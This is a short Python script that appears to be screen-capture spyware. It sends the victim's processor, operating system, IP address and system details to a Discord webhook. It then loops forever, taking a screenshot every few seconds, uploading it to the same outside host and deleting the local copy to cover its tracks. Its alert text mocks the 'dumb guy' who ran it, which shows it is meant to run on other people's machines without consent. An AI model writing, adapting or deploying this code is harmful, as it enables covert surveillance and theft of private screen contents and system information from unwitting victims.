# imports

import PIL.ImageGrab
import PIL.ImageFile

from discord_webhook import DiscordWebhook
import socket
import platform

import os

import time

# variables

webhookurl = "your_webhook_url"

# webhook stuff

webhookcontent = f"""
@everyone
```ini
[+] Someone dumb guy ran the code!

Computer information:
[+] Processor: {platform.processor()}
[+] OS: {platform.system()}
[+] IP: {socket.gethostbyname(socket.gethostname())}

[+] {platform.uname()}
```
"""

webhook = DiscordWebhook(url=webhookurl, content=webhookcontent, rate_limit_retry=True)

# capture loop

while (True):
  time.sleep(5)

  img = PIL.ImageGrab.grab()
  img.save("screenshot.jpg")

  with open(f"{os.getcwd()}/screenshot.jpg", "rb") as f:
    webhook.add_file(file=f.read(), filename="screenshot.jpg")

  response = webhook.execute()

  time.sleep(1)
  os.remove("screenshot.jpg")
